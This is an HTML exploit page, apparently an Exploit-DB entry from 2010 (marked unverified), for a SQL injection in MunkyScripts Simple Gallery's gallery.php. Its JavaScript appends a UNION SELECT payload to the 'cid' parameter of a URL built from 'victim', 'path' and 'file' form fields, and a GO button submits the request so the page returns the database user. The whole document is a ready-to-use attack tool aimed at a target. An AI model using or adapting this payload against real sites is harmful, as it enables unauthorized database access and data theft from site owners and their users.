@@ -1,0 +1,71 @@
+# Title: MunkyScripts Simple Gallery SQL Injection Vulnerability
+# EDB-ID: 12045
+# CVE-ID: ()
+# OSVDB-ID: ()
+# Author: ItSecTeam
+# Published: 2010-04-04
+# Verified: no
+# Download Exploit Code
+# Download Vulnerable app
+
+view source
+print?
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1254&quot;&gt;
+&lt;title&gt;coded by ahmadbady&lt;/title&gt;
+ 
+&lt;script language=&quot;JavaScript&quot;&gt;
+ 
+//===========================================================================
+//( #Topic    : MunkyScripts Simple Gallery
+//( #Bug type : SQL Injection Vulnerability
+//( #Advisory :
+//===========================================================================
+//( #Author : ItSecTeam
+//( #Email  : Bug@ITSecTeam.com
+//( #Website: http://www.itsecteam.com
+//( #Forum  : http://forum.ITSecTeam.com
+//---------------------------------------------------------------------
+ 
+ 
+var sqll =&quot;?cid=&#039;/**/UNION/**/SELECT/**/1,2,(concat_ws(0x3a,user())),4/*&quot;
+   
+ function it(){
+                xpl.action= xpl.victim.value+xpl.path.value+xpl.file.value+sqll;xpl.submit();                                       
+            }
+&lt;/script&gt;
+ 
+&lt;/head&gt;
+ 
+&lt;body bgcolor=&quot;#FFFFFF&quot;&gt;
+ 
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#0000FF&quot;&gt;MunkyScripts Simple Gallery: SQL Injection
+Vulnerability&lt;/font&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;&lt;font color=&quot;#0000FF&quot;&gt;-----------------------------------&lt;/font&gt;&lt;/p&gt;
+&lt;form method=&quot;post&quot; name=&quot;xpl&quot; onSubmit=&quot;it();&quot;&gt;
+    &lt;p align=&quot;left&quot;&gt;
+    &lt;font
+size=&quot;2&quot; face=&quot;Tahoma&quot;&gt;
+    victim:
+    &lt;input type=&quot;text&quot; name=&quot;victim&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot; value=&quot;http://127.0.0.1&quot;&gt;
+    path:
+    &lt;input type=&quot;text&quot; name=&quot;path&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot; value=&quot;/SimpleGallery/&quot;&gt;
+    file:
+    &lt;input type=&quot;text&quot; name=&quot;file&quot; size=&quot;20&quot;;&quot; style=&quot;color: #FFFFFF; background-color: #000000&quot; value=&quot;gallery.php&quot;&gt;
+    &lt;/p&gt;
+    &lt;/p&gt;
+&lt;center&gt;
+ 
+&lt;/p&gt;
+  &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;GO&quot; name=&quot;B1&quot; style=&quot;float: left&quot;&gt;&lt;input type=&quot;reset&quot;
+value=&quot;reset&quot; name=&quot;B2&quot; style=&quot;float: left&quot;&gt;&lt;/p&gt;
+&lt;/form&gt;
+&lt;p&gt;&lt;br&gt;
+ &lt;/p&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+ 
+&lt;/html&gt;
+
+
